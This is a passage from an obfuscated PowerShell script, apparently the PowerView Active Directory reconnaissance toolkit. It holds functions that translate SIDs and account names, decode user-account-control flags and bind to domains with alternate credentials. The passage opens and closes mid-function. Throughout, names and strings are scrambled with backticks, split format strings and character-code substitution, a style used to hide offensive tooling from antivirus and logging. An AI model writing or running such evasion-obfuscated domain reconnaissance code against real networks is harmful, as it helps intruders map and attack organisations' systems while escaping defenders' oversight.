        [Parameter(MAnDatOry = ${TR`Ue}, valuEFRomPipELiNe = ${t`Rue}, VALUeFRoMPipEliNeBypROPerTYnaME = ${t`RUE})]
        [Alias('SID')]
        [ValidatePattern({"{0}{2}{1}"-f '^S-','-.*','1'})]
        [String[]]
        ${o`BJ`EcTsId},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DoMA`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{4}{3}{0}{2}"-f 'nControll','D','er','ai','om'})]
        [String]
        ${Ser`VeR},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crEDEn`T`ial} =   (  gEt-cHiLDiteM VaRiABlE:0dsQR).vAlue::"Em`PTY"
    )

    BEGIN {
        ${adn`A`Me`ARguMEnTs} = @{}
        if (${PSBoUndP`ARA`Me`T`ERs}[("{0}{1}{2}"-f 'Do','m','ain')]) { ${ADna`meA`RGu`MEN`TS}[("{0}{1}" -f'Doma','in')] = ${D`OmA`In} }
        if (${pSbouN`Dpa`Ra`me`TERs}[("{2}{0}{1}"-f 'rv','er','Se')]) { ${aDN`AmeargUM`en`TS}[("{1}{0}"-f'er','Serv')] = ${s`e`Rver} }
        if (${ps`B`o`UnDpARAM`etE`RS}[("{2}{0}{3}{1}"-f'r','tial','C','eden')]) { ${AdNA`Me`ArGu`MEn`Ts}[("{1}{0}{2}"-f're','C','dential')] = ${CReDe`N`TiaL} }
    }

    PROCESS {
        ForEach (${TA`Rge`Ts`iD} in ${OBJEcT`S`Id}) {
            ${T`ARgET`sId} = ${t`A`RgEt`Sid}.("{1}{0}"-f 'rim','t').Invoke('*')
            try {
                
                Switch (${Tar`GET`SiD}) {
                    ("{1}{0}"-f '0','S-1-')         { ("{3}{1}{2}{0}" -f 'ty',' Auth','ori','Null') }
                    ("{0}{1}"-f'S','-1-0-0')       { ("{0}{1}"-f'No','body') }
                    ("{0}{1}"-f'S-1-','1')         { ("{1}{2}{3}{0}"-f'ty','W','orld Auth','ori') }
                    ("{2}{0}{1}"-f '1','-1-0','S-')       { ("{0}{1}" -f'E','veryone') }
                    ("{0}{1}" -f 'S-1-','2')         { ("{2}{0}{1}" -f 'thori','ty','Local Au') }
                    ("{0}{1}"-f 'S-1-','2-0')       { ("{1}{0}"-f'l','Loca') }
                    ("{0}{2}{1}" -f'S','2-1','-1-')       { ("{3}{1}{2}{0}"-f 'n ',' L','ogo','Console') }
                    ("{0}{1}"-f 'S-','1-3')         { ("{2}{5}{3}{4}{0}{1}" -f' Autho','rity','C','ea','tor','r') }
                    ("{1}{0}" -f'-1-3-0','S')       { ("{0}{1}{4}{3}{2}" -f'C','rea','ner',' Ow','tor') }
                    ("{0}{2}{1}"-f'S-1-','-1','3')       { ("{2}{3}{0}{1}"-f 'to','r Group','C','rea') }
                    ("{1}{0}"-f'2','S-1-3-')       { ("{0}{1}{6}{4}{3}{2}{5}"-f 'C','re','rv','Owner Se','tor ','er','a') }
                    ("{0}{1}{2}"-f'S','-1-3-','3')       { ("{5}{4}{1}{3}{0}{2}{6}" -f'erv','Gro','e','up S','ator ','Cre','r') }
                    ("{1}{0}"-f '-4','S-1-3')       { ("{3}{0}{1}{2}" -f 'wner',' R','ights','O') }
                    ("{0}{1}"-f'S-1','-4')         { ("{1}{3}{2}{4}{0}"-f'ty','Non','e Aut','-uniqu','hori') }
                    ("{0}{1}"-f 'S','-1-5')         { ("{1}{2}{0}" -f 'y','NT Aut','horit') }
                    ("{1}{0}{2}"-f '5','S-1-','-1')       { ("{1}{0}"-f'ialup','D') }
                    ("{1}{0}" -f '-1-5-2','S')       { ("{1}{0}"-f 'twork','Ne') }
                    ("{2}{0}{1}" -f '5-','3','S-1-')       { ("{0}{1}" -f'Ba','tch') }
                    ("{0}{1}{2}"-f'S','-1-5','-4')       { ("{2}{3}{0}{1}" -f 'ct','ive','In','tera') }
                    ("{0}{1}"-f'S-1-','5-6')       { ("{1}{0}"-f'rvice','Se') }
                    ("{2}{0}{1}"-f '5-','7','S-1-')       { ("{2}{1}{0}"-f's','nymou','Ano') }
                    ("{1}{2}{0}"-f '5-8','S-1','-')       { ("{0}{1}"-f 'P','roxy') }
                    ("{2}{0}{1}"-f '-','1-5-9','S')       { ("{7}{4}{3}{0}{6}{5}{8}{1}{2}"-f'e ','rol','lers','ris','terp','in ','Doma','En','Cont') }
                    ("{2}{1}{0}" -f'5-10','-1-','S')      { ("{3}{2}{0}{1}" -f 'al S','elf','ncip','Pri') }
                    ("{1}{0}"-f '-1-5-11','S')      { ("{3}{0}{5}{2}{1}{4}"-f 'te','e','s','Authentica','rs','d U') }
                    ("{1}{2}{0}" -f '12','S','-1-5-')      { ("{3}{1}{0}{2}" -f' Cod','stricted','e','Re') }
                    ("{0}{1}{2}" -f'S-1-','5-1','3')      { ("{1}{2}{0}{3}"-f 'l Serv','Term','ina','er Users') }
                    ("{0}{1}{2}" -f'S-','1-5-1','4')      { ("{6}{0}{2}{5}{4}{3}{1}" -f'm','n','ote','go','Lo',' Interactive ','Re') }
                    ("{1}{0}"-f'1-5-15','S-')      { ("{2}{1}{3}{0}{5}{4}"-f 'i','s Or','Thi','ganizat',' ','on') }
                    ("{1}{0}{2}"-f '5','S-1-','-17')      { ("{0}{4}{1}{2}{3}" -f'Thi','niza','t','ion ','s Orga') }
                    ("{0}{2}{1}"-f'S','8','-1-5-1')      { ("{1}{0}{3}{2}" -f'yst','Local S','m','e') }
                    ("{0}{1}{2}" -f'S-1-5','-','19')      { ("{0}{3}{2}{1}"-f'NT','ty','thori',' Au') }
                    ("{0}{1}" -f 'S','-1-5-20')      { ("{0}{1}{2}{3}"-f 'NT ','Au','th','ority') }
                    ("{2}{1}{0}" -f'-80-0','-5','S-1')    { ("{2}{3}{4}{0}{1}"-f'vic','es ','All',' Se','r') }
                    ("{1}{0}{2}"-f'-1-5-','S','32-544')  { ((("{0}{4}{1}{6}{2}{5}{3}"-f'BU','XAdminist','a','s','ILTINVi','tor','r'))-RePLACe([CHAr]86+[CHAr]105+[CHAr]88),[CHAr]92) }
                    ("{1}{2}{0}"-f '-5-32-545','S-','1')  { ((("{0}{1}{2}{3}" -f 'BUILT','IN{0','}U','sers'))-F  [ChAR]92) }
                    ("{0}{1}{2}"-f 'S-1-5-','32','-546')  { ((("{4}{5}{0}{2}{1}{3}"-f'0','Gues','}','ts','BUILT','IN{')) -f  [CHar]92) }
                    ("{2}{3}{0}{1}" -f '-54','7','S-1-5-','32')  { ((("{0}{2}{3}{4}{5}{1}"-f'BUILT','ers','IN','{0}P','owe','r Us'))  -F[CHaR]92) }
                    ("{2}{0}{1}"-f '1','-5-32-548','S-')  { ((("{0}{1}{3}{7}{6}{2}{4}{5}"-f 'BUIL','TI','t Ope','NQ','ra','tors','un','TWAcco')).("{1}{0}"-f'CE','rePla').Invoke('QTW','\')) }
                    ("{0}{2}{1}"-f 'S-1','5-32-549','-')  { ((("{0}{1}{2}{3}{4}"-f 'BUILTINPw2Server ','Oper','a','t','ors'))-CRePlacE ([ChaR]80+[ChaR]119+[ChaR]50),[ChaR]92) }
                    ("{1}{3}{0}{2}"-f '32-','S','550','-1-5-')  { ((("{1}{3}{4}{5}{0}{2}" -f'S','BUILT','Print Operators','I','N','cz'))."Re`PL`ACE"('czS',[sTRiNG][cHar]92)) }
                    ("{2}{0}{3}{1}" -f '1','5-32-551','S-','-')  { ((("{5}{1}{3}{4}{0}{6}{2}"-f 'Ope','a','rs','ck','up ','BUILTINqGWB','rato'))-CREpLaCE'qGW',[CHAr]92) }
                    ("{2}{0}{3}{1}"-f '-5-','-552','S-1','32')  { ((("{1}{3}{2}{5}{4}{0}" -f 'ors','B','rsnRe','UILTIN','cat','pli')) -rePLACE 'rsn',[chAR]92) }
                    ("{1}{0}{3}{2}" -f'-32','S-1-5','4','-55')  { ((("{4}{2}{1}{6}{7}{3}{5}{0}"-f's','fPre-Wind','e3','ible A','BUILTIN','cces','ows 20','00 Compat'))-repLACe  ([chaR]101+[chaR]51+[chaR]102),[chaR]92) }
                    ("{2}{1}{0}" -f '32-555','-1-5-','S')  { ((("{4}{0}{1}{7}{2}{8}{3}{5}{6}"-f 'UIL','TI','emote','esk','B','to','p Users','NPLKR',' D')) -CreplAcE 'PLK',[Char]92) }
                    ("{3}{2}{1}{0}"-f'6','2-55','3','S-1-5-')  { ((("{9}{7}{3}{6}{8}{2}{5}{4}{0}{1}" -f 'ato','rs','Config','ILTI','ation Oper','ur','N{0}Netw','U','ork ','B'))-f[chAr]92) }
                    ("{2}{0}{1}" -f '-32-','557','S-1-5')  { ((("{1}{3}{11}{10}{0}{7}{4}{6}{5}{2}{8}{9}"-f'ng','BUIL','u','TIN','For','st Tr','e',' ','st Builder','s','Incomi','{0}')) -f[ChAr]92) }
                    ("{0}{1}{2}" -f 'S-1-5','-3','2-558')  { ((("{5}{1}{4}{6}{0}{3}{2}{7}{8}"-f 'mance Monitor','UILTINDIEP','U',' ','erf','B','or','ser','s'))."RepLA`ce"('DIE',[sTrING][ChaR]92)) }
                    ("{0}{2}{1}" -f 'S-1-','32-559','5-')  { ((("{5}{1}{0}{4}{6}{3}{2}"-f 'm','Perfor','s','Log User','anc','BUILTIN{0}','e '))-f[chaR]92) }
                    ("{1}{0}{3}{2}"-f'5-','S-1-','-560','32')  { ((("{3}{1}{5}{8}{6}{2}{7}{4}{0}"-f'ess Group','N4VaWin','n A','BUILTI','c','dows Auth','rizatio','c','o'))."R`EpLAcE"(([chAr]52+[chAr]86+[chAr]97),'\')) }
                    ("{3}{0}{2}{1}"-f'-5-','1','32-56','S-1')  { ((("{2}{5}{7}{0}{4}{1}{8}{6}{3}" -f 'minal Serv',' Licens','BUILTINDnuT','rs','er','e','Serve','r','e ')).("{2}{1}{0}" -f'ace','l','rep').Invoke('Dnu','\')) }
                    ("{0}{2}{1}{3}"-f'S-1-5-','6','32-5','2')  { ((("{10}{3}{5}{8}{4}{2}{0}{9}{7}{1}{6}" -f 'ut','Us','b','ILTIN{0}','i','Di','ers',' ','str','ed COM','BU'))  -F [CHaR]92) }
                    ("{0}{1}{2}"-f'S-1-','5-32-','569')  { ((("{0}{5}{2}{4}{3}{6}{1}" -f 'BUI','rs','phic ','era','Op','LTIN{0}Cryptogra','to')) -F[ChaR]92) }
                    ("{3}{0}{1}{2}" -f'-5-','32','-573','S-1')  { ((("{4}{2}{1}{3}{0}"-f 'Readers','ve','UILTIN{0}E','nt Log ','B')) -F[cHAR]92) }
                    ("{3}{2}{1}{0}" -f '74','2-5','-1-5-3','S')  { ((("{10}{6}{5}{2}{4}{7}{11}{3}{8}{0}{9}{1}" -f 'rvic','M Access','INHEwCer','S','t','ILT','U','ifi','e','e DCO','B','cate '))."r`EplAce"('HEw',[stRiNg][chAR]92)) }
                    ("{1}{0}{2}{3}"-f'1-5-3','S-','2-','575')  { ((("{7}{1}{3}{8}{2}{4}{6}{9}{0}{5}"-f'ccess Ser','TIN',' R','F','e','vers','mot','BUIL','z3RDS','e A')).("{0}{1}" -f 'rEp','laCE').Invoke('Fz3','\')) }
                    ("{3}{1}{0}{2}" -f'-32-','-5','576','S-1')  { ((("{7}{8}{4}{0}{6}{5}{2}{1}{3}" -f'{','t Se','poin','rvers','LTIN','S End','0}RD','BU','I'))  -f  [ChAR]92) }
                    ("{2}{0}{1}{3}"-f '1','-5-3','S-','2-577')  { ((("{6}{8}{7}{1}{5}{0}{3}{2}{4}" -f'e','INC0HR','erv','ment S','ers','DS Manag','BU','T','IL'))."Re`PLACe"(([ChAR]67+[ChAR]48+[ChAR]72),'\')) }
                    ("{2}{3}{1}{0}" -f '8','7','S-1','-5-32-5')  { ((("{2}{6}{4}{3}{1}{0}{8}{5}{7}"-f'r','-V Administ','B','per','VUHy','tor','UILTING','s','a'))."r`EpLaCe"(([chAr]71+[chAr]86+[chAr]85),'\')) }
                    ("{1}{2}{3}{0}" -f'-32-579','S','-1','-5')  { ((("{7}{1}{9}{11}{0}{3}{4}{8}{12}{10}{6}{2}{5}"-f 'ccess ','ILTI','at','Cont','r','ors',' Oper','BU','o','N','stance','2IPA','l Assi'))  -REplAce  ([cHaR]50+[cHaR]73+[cHaR]80),[cHaR]92) }
                    ("{0}{2}{1}{3}"-f 'S-','-5','1','-32-580')  { ((("{2}{3}{0}{6}{1}{4}{5}{7}{8}" -f'INsJpAccess Contr','l As','BUI','LT','sistance O','p','o','erat','ors'))."REP`l`ACE"(([cHaR]115+[cHaR]74+[cHaR]112),'\')) }
                    ("{0}{1}{2}" -f'Def','a','ult') {
                        &("{3}{1}{0}{2}" -f 'v','n','ert-ADName','Co') -Identity ${t`AR`GEtSID} @ADNameArguments
                    }
                }
            }
            catch {
                &("{2}{1}{0}" -f'rbose','Ve','Write-') ('[Convert'+'F'+'rom'+'-SI'+'D] '+'E'+'rr'+'or '+'con'+'v'+'erting '+'S'+'ID '+"'$TargetSid' "+': '+"$_")
            }
        }
    }
}


function conVEr`T-A`dNa`me {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{6}{5}{10}{11}{8}{9}{7}{0}{2}{4}{3}{1}"-f'ateCha','ns','ngingFun','o','cti','S','PSUse','St','ess','For','houldPr','oc'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(mandATORy = ${tr`UE}, VALueFROMPIpElinE = ${T`RUe}, VALuEfroMpipELinebyPROPerTynaMe = ${tR`Ue})]
        [Alias({"{1}{0}" -f 'ame','N'}, {"{1}{3}{2}{0}"-f 'e','Obj','am','ectN'})]
        [String[]]
        ${I`dEnti`TY},

        [String]
        [ValidateSet('DN', {"{2}{1}{0}"-f 'onical','n','Ca'}, 'NT4', {"{0}{1}{2}"-f'D','is','play'}, {"{2}{1}{0}{3}" -f'inSim','oma','D','ple'}, {"{3}{2}{1}{0}"-f 'le','riseSimp','p','Enter'}, {"{0}{1}" -f 'GUI','D'}, {"{2}{1}{0}"-f 'own','nkn','U'}, 'UPN', {"{0}{2}{1}{3}" -f 'C','ical','anon','Ex'}, 'SPN')]
        ${o`U`TPU`Ttype},

        [ValidateNotNullOrEmpty()]
        [String]
        ${D`omAIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{3}{0}{2}"-f 'o','Doma','ntroller','inC'})]
        [String]
        ${sER`V`er},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`eDeNtIAL} =   ( GET-vaRIaBLE 0DSqr -vaLUEonl)::"EMP`TY"
    )

    BEGIN {
        ${nA`mEt`Ypes} = @{
            'DN'                =   1  
            ("{2}{1}{0}"-f'cal','i','Canon')         =   2  
            'NT4'               =   3  
            ("{1}{2}{0}" -f 'y','Dis','pla')           =   4  
            ("{0}{2}{1}"-f 'DomainS','mple','i')      =   5  
            ("{2}{1}{3}{0}"-f 'ple','pri','Enter','seSim')  =   6  
            ("{1}{0}"-f 'D','GUI')              =   7  
            ("{2}{1}{0}" -f 'own','kn','Un')           =   8  
            'UPN'               =   9  
            ("{1}{0}{2}{3}"-f 'ni','Cano','ca','lEx')       =   10 
            'SPN'               =   11 
            'SID'               =   12 
        }

        
        function InVo`ke-`ME`THod([__ComObject] ${Obj`E`CT}, [String] ${m`e`ThOD}, ${pa`RAm`eTe`Rs}) {
            ${o`UTp`UT} = ${nU`lL}
            ${OUt`P`Ut} = ${Obj`EcT}.("{0}{2}{1}"-f 'Ge','ype','tT').Invoke().("{3}{0}{1}{2}" -f 'nvo','ke','Member','I').Invoke(${me`T`hod}, ("{1}{0}{2}{3}" -f 'voke','In','Me','thod'), ${n`ULl}, ${ob`Je`CT}, ${pa`R`AmET`ErS})
            &("{0}{1}{2}" -f'Writ','e-Outpu','t') ${o`U`TPut}
        }

        function g`e`T-proPer`Ty([__ComObject] ${oB`JEct}, [String] ${p`Ro`peR`TY}) {
            ${O`Bje`ct}.("{0}{2}{1}" -f'Get','pe','Ty').Invoke().("{3}{1}{0}{2}" -f'embe','okeM','r','Inv').Invoke(${pRo`Pe`Rty}, ("{2}{1}{0}" -f 'y','ropert','GetP'), ${N`ULl}, ${oB`JeCT}, ${nu`Ll})
        }

        function s`et-`p`ROPeRTY([__ComObject] ${O`BJ`ECt}, [String] ${P`Rop`ERTy}, ${PaR`Am`ET`eRS}) {
            [Void] ${OB`JECT}.("{0}{1}" -f'GetTyp','e').Invoke().("{0}{2}{1}"-f 'In','keMember','vo').Invoke(${p`RoP`erTY}, ("{2}{1}{0}"-f'tProperty','e','S'), ${nu`lL}, ${O`BjECt}, ${PAR`AM`E`TERS})
        }

        
        if (${psBOUn`DP`A`R`AmEtErS}[("{0}{2}{1}"-f'Ser','r','ve')]) {
            ${aDSI`NiT`TyPe} = 2
            ${i`NItn`Ame} = ${Se`Rv`eR}
        }
        elseif (${p`SBoU`NdPAra`Me`TeRS}[("{0}{1}" -f'Domai','n')]) {
            ${aD`sI`NIt`TyPe} = 1
            ${iNI`T`NAME} = ${do`Main}
        }
        elseif (${Ps`B`oUN`dPAramE`TerS}[("{1}{2}{0}" -f 'l','C','redentia')]) {
            ${c`RED} = ${C`R`ed`entIAl}.("{5}{3}{0}{2}{1}{4}" -f'etwor','nt','kCrede','tN','ial','Ge').Invoke()
            ${A`DsInITT`Y`PE} = 1
            ${IniT`NaME} = ${Cr`eD}."d`oM`AIn"
        }
        else {
            
            ${aDsi`N`ItTyPe} = 3
            ${in`it`NaME} = ${nU`LL}
        }
    }

    PROCESS {
        ForEach (${T`A`RGEtidEn`TIty} in ${i`DeNTITy}) {
            if (-not ${PSbO`U`NdpA`Ra`MetERS}[("{1}{2}{0}" -f'pe','Out','putTy')]) {
                if (${tArg`Et`I`dENTI`TY} -match ((("{0}{2}{4}{6}{5}{3}{1}"-f '^','+','[A','Za-z ]','-Za-z]+{0}','0}[A-','{'))  -F  [CHAR]92)) {
                    ${aD`so`UtP`UtT`YpE} = ${nA`Me`T`Ypes}[("{0}{2}{1}{3}"-f 'DomainS','mp','i','le')]
                }
                else {
                    ${Ad`Soutp`UTtY`PE} = ${N`AMe`TYP`es}['NT4']
                }
            }
            else {
                ${AD`S`o`UTpU`TTypE} = ${N`A`MEt`ypES}[${out`P`UtTYpe}]
            }

            ${TrAN`S`laTe} = &("{2}{0}{1}" -f 'ew-O','bject','N') -ComObject ("{2}{0}{3}{1}" -f 'eTrans','ate','Nam','l')

            if (${psbO`UndParAmet`E`RS}[("{0}{1}{2}"-f 'Creden','t','ial')]) {
                try {
                    ${C`ReD} = ${c`Re`denTIaL}.("{4}{1}{0}{2}{3}{5}"-f 'tw','Ne','ork','Creden','Get','tial').Invoke()

                    &("{1}{2}{0}"-f 'ethod','Invok','e-M') ${TR`An`SLA`TE} ("{0}{1}"-f'I','nitEx') (
                        ${aDS`INitT`Y`pe},
                        ${i`NiTN`Ame},
                        ${c`REd}."u`s`ErNaME",
                        ${C`RED}."do`maiN",
                        ${c`REd}."p`AsSwo`Rd"
                    )
                }
                catch {
                    &("{3}{2}{1}{0}"-f'erbose','-V','e','Writ') ('['+'Convert-ADN'+'a'+'me]'+' '+'Erro'+'r '+'i'+'niti'+'aliz'+'ing '+'tra'+'nslati'+'on'+' '+'for'+' '+"'$Identity' "+'usi'+'ng'+' '+'al'+'ternat'+'e '+'cred'+'entials'+' '+': '+"$_")
                }
            }
            else {
                try {
                    ${N`ULL} = &("{0}{1}{3}{2}" -f 'Inv','o','hod','ke-Met') ${t`R`ANSlAtE} ("{1}{0}" -f'it','In') (
                        ${aD`siNiTT`Y`pE},
                        ${INI`TN`AmE}
                    )
                }
                catch {
                    &("{1}{2}{0}"-f 'te-Verbose','W','ri') ('[Convert-'+'AD'+'Name]'+' '+'Err'+'or'+' '+'in'+'itiali'+'zing '+'tra'+'nslat'+'i'+'on '+'fo'+'r '+"'$Identity' "+': '+"$_")
                }
            }

            
            &("{2}{0}{1}{3}" -f 'et-','Pr','S','operty') ${t`RaN`sL`Ate} ("{4}{3}{2}{0}{1}" -f 'r','al','Refer','e','Chas') (0x60)

            try {
                
                ${NU`lL} = &("{0}{3}{1}{2}" -f 'In','ke-Meth','od','vo') ${tRA`N`S`Late} 'Set' (8, ${taR`ge`TIdeN`TITY})
                &("{2}{3}{1}{0}" -f 'hod','e-Met','In','vok') ${t`R`ANSlate} 'Get' (${a`dS`O`UtpuTtY`pe})
            }
            catch [System.Management.Automation.MethodInvocationException] {
                &("{1}{0}{4}{3}{2}" -f 'ite-Ve','Wr','e','s','rbo') "[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message) "
            }
        }
    }
}


function cONveRtf`RoM-U`AC`VAluE {


    [OutputType({"{9}{2}{8}{11}{3}{5}{0}{4}{10}{7}{6}{1}"-f'ec','ionary','em','i','ialized.O','ons.Sp','t','deredDic','.Coll','Syst','r','ect'})]
    [CmdletBinding()]
    Param(
        [Parameter(ManDatORY = ${T`RUE}, VALuEfrOmPiPElIne = ${T`RUE}, vALUeFroMPipeLineBypropErtynamE = ${t`RUE})]
        [Alias('UAC', {"{0}{5}{1}{4}{3}{2}" -f'us','raccoun','l','contro','t','e'})]
        [Int]
        ${V`ALuE},

        [Switch]
        ${s`hOWAll}
    )

    BEGIN {
        
        ${UACv`ALU`Es} = &("{0}{2}{3}{1}" -f 'New','ect','-','Obj') ("{5}{7}{3}{0}{4}{6}{2}{1}"-f 'ons.Spec','ary','Diction','ti','i','Sys','alized.Ordered','tem.Collec')
        ${uACV`AL`UeS}.("{1}{0}" -f 'd','Ad').Invoke(("{0}{1}" -f'SC','RIPT'), 1)
        ${Ua`c`Val`UES}.("{1}{0}" -f 'dd','A').Invoke(("{1}{0}{2}{3}"-f 'DISA','ACCOUNT','B','LE'), 2)
        ${u`AC`Va`luEs}.("{1}{0}" -f'd','Ad').Invoke(("{2}{1}{0}{3}" -f'_REQUIRE','R','HOMEDI','D'), 8)
        ${UAcV`A`L`UeS}.("{0}{1}" -f 'Ad','d').Invoke(("{0}{1}"-f 'LOC','KOUT'), 16)
        ${Uacv`ALu`ES}.("{1}{0}"-f'dd','A').Invoke(("{4}{2}{1}{0}{3}"-f'D_NOT','SW','S','REQD','PA'), 32)
        ${Ua`C`VALues}.("{0}{1}" -f'A','dd').Invoke(("{3}{0}{1}{2}"-f'ANT_CH','AN','GE','PASSWD_C'), 64)
        ${uacva`L`UES}.("{1}{0}" -f 'd','Ad').Invoke(("{2}{4}{3}{0}{1}"-f'PWD','_ALLOWED','EN','TED_TEXT_','CRYP'), 128)
        ${U`ACvA`Lues}.("{0}{1}"-f 'A','dd').Invoke(("{3}{0}{4}{2}{5}{1}"-f 'DUP','T','ICATE_ACCO','TEMP_','L','UN'), 256)
        ${u`ACvalU`es}.("{1}{0}" -f'dd','A').Invoke(("{2}{1}{3}{0}"-f'T','C','NORMAL_AC','OUN'), 512)
        ${u`Ac`VAlUES}.("{1}{0}" -f 'dd','A').Invoke(("{2}{0}{3}{1}{4}{5}"-f'NTERD','AIN_TRUST_ACCOU','I','OM','N','T'), 2048)
        ${Ua`CvA`Lues}.("{1}{0}"-f 'd','Ad').Invoke(("{4}{2}{0}{3}{1}" -f 'UST_ACC','T','TATION_TR','OUN','WORKS'), 4096)
        ${U`Acva`lueS}.("{0}{1}"-f 'A','dd').Invoke(("{2}{5}{0}{3}{1}{4}" -f'_TRUS','ACCO','S','T_','UNT','ERVER'), 8192)
        ${u`AC`VAluEs}.("{1}{0}" -f 'dd','A').Invoke(("{2}{0}{5}{3}{4}{1}"-f '_EX','WORD','DONT','IR','E_PASS','P'), 65536)
        ${U`AC`VALuEs}.("{1}{0}" -f'dd','A').Invoke(("{1}{3}{0}{2}"-f'OU','MNS_L','NT','OGON_ACC'), 131072)
        ${UAC`V`AlU`ES}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{5}{2}{3}{4}{1}" -f 'SMARTCAR','D','EQ','UIR','E','D_R'), 262144)
        ${Uac`VA`LuEs}.("{1}{0}"-f 'd','Ad').Invoke(("{3}{5}{4}{0}{2}{1}" -f 'L','GATION','E','TRUSTE','_FOR_DE','D'), 524288)
        ${uac`Va`LUEs}.("{0}{1}"-f 'A','dd').Invoke(("{2}{1}{0}" -f 'EGATED','EL','NOT_D'), 1048576)
        ${UAcva`lU`eS}.("{0}{1}"-f 'Ad','d').Invoke(("{3}{5}{1}{2}{4}{0}" -f'ONLY','DE','S_','U','KEY_','SE_'), 2097152)
        ${uA`cVA`l`UEs}.("{0}{1}"-f'A','dd').Invoke(("{1}{3}{2}{0}" -f 'AUTH','DO','_REQ_PRE','NT'), 4194304)
        ${uACv`ALU`ES}.("{0}{1}"-f'A','dd').Invoke(("{2}{1}{3}{0}" -f 'PIRED','OR','PASSW','D_EX'), 8388608)
        ${Ua`C`VALUES}.("{0}{1}" -f 'Ad','d').Invoke(("{1}{2}{4}{0}{3}" -f'TH_FOR_DELEGATI','TRU','STED_TO_A','ON','U'), 16777216)
        ${uacv`A`L`Ues}.("{0}{1}"-f 'Ad','d').Invoke(("{1}{4}{0}{6}{3}{2}{5}" -f 'IA','PAR','S_ACC','ECRET','T','OUNT','L_S'), 67108864)
    }

    PROCESS {
        ${Res`UlTU`AC`VaLU`eS} = &("{2}{1}{0}" -f 'ect','w-Obj','Ne') ("{6}{5}{4}{8}{1}{2}{9}{3}{7}{0}" -f'ry','pec','ialized','OrderedDicti','ons','ystem.Collecti','S','ona','.S','.')

        if (${sh`o`WalL}) {
            ForEach (${u`A`cValUE} in ${uAc`VAlU`Es}.("{0}{2}{1}" -f'GetE','umerator','n').Invoke()) {
                if ( (${vaL`Ue} -band ${UAC`VAl`UE}."v`AlUE") -eq ${U`A`cVaLUe}."Va`lUE") {
                    ${Re`s`ULt`U`ACva`lues}.("{0}{1}" -f'A','dd').Invoke(${u`A`CvaLue}."N`AME", "$($UACValue.Value)+")
                }
                else {
                    ${REs`ULtUacV`ALU`eS}.("{0}{1}" -f'Ad','d').Invoke(${u`AcvA`Lue}."Na`Me", "$($UACValue.Value)")
                }
            }
        }
        else {
            ForEach (${U`ACVal`UE} in ${u`Ac`VAlUes}.("{3}{4}{2}{0}{1}"-f'ra','tor','nume','Ge','tE').Invoke()) {
                if ( (${v`Alue} -band ${uA`C`VAlUE}."V`ALue") -eq ${u`AcvaL`UE}."V`AluE") {
                    ${RESU`lT`UaCvAL`UeS}.("{1}{0}"-f'dd','A').Invoke(${U`Ac`Value}."n`AME", "$($UACValue.Value)")
                }
            }
        }
        ${rEs`ULtua`cV`ALUES}
    }
}


function G`ET-`PRInc`iPALcO`N`TeXT {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{1}{2}" -f 'PSSh','roce','ss','ouldP'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(PosITion = 0, maNDAtorY = ${tr`UE})]
        [Alias({"{0}{1}" -f 'GroupNam','e'}, {"{2}{1}{3}{0}"-f'ntity','o','Gr','upIde'})]
        [String]
        ${i`dE`Ntity},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DoMa`In},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CReDe`NTI`AL} =   ( Ls ('vArIABl'+'e:0d'+'s'+'Qr') ).ValuE::"e`MpTY"
    )

    &("{1}{0}" -f 'd-Type','Ad') -AssemblyName ("{4}{11}{7}{5}{2}{3}{8}{6}{10}{9}{0}{1}{12}"-f '.Acc','o','r','yS','Sys','irecto','c','D','ervi','s','e','tem.','untManagement')

    try {
        if (${PsBo`UND`PA`RAMeTeRs}[("{0}{1}"-f 'Domai','n')] -or (${iD`EnTITy} -match ((("{0}{3}{1}{2}"-f '.+{','0','}.+','0}{')) -F [CHaR]92))) {
            if (${I`d`EnTITy} -match ((("{3}{2}{1}{0}" -f '+','4.','H','.+iH4i'))  -rEPlAcE([CHaR]105+[CHaR]72+[CHaR]52),[CHaR]92)) {
                
                ${C`On`VeR`TeDIDEn`TI`Ty} = ${ideNt`i`TY} | &("{3}{1}{0}{2}" -f '-AD','t','Name','Conver') -OutputType ("{0}{1}" -f 'Can','onical')
                if (${C`o`NV`eRTEd`IDeNtI`Ty}) {
                    ${CoNNE`Ct`T`A`RGEt} = ${CoN`VE`RT`eDI`dEN`TiTy}.("{0}{1}" -f'SubStrin','g').Invoke(0, ${cO`NvErtE`Dide`NTI`TY}.("{0}{1}"-f'Index','Of').Invoke('/'))
                    ${o`BJ`E`CtiDEnTItY} = ${I`D`eNtItY}.("{1}{0}" -f'plit','S').Invoke('\')[1]
                    &("{0}{2}{1}"-f 'Write-Ve','se','rbo') ('['+'Ge'+'t'+'-Princ'+'ipalCon'+'tex'+'t] '+'B'+'inding '+'to'+' '+'do'+'ma'+'in '+"'$ConnectTarget'")
                }
            }
            else {
                ${o`BjecT`IDE`NTI`Ty} = ${idE`Nt`ITy}
                &("{0}{2}{3}{1}"-f'Wr','Verbose','i','te-') ('[Get-P'+'rincip'+'alC'+'o'+'n'+'tex'+'t] '+'Bindi'+'ng '+'t'+'o '+'do'+'main '+"'$Domain'")
                ${COn`NeC`Ttar`get} = ${D`oM`Ain}
            }

            if (${p`SBOUndPAR`AmE`TE`Rs}[("{1}{0}{2}{3}" -f 'r','C','edentia','l')]) {
                &("{1}{2}{0}" -f'ose','Write','-Verb') ("{9}{10}{4}{0}{2}{6}{8}{7}{5}{3}{1}" -f 'ipa','ls','lCo','dentia','-Princ','re','ntext] Us',' alternate c','ing','[Ge','t')
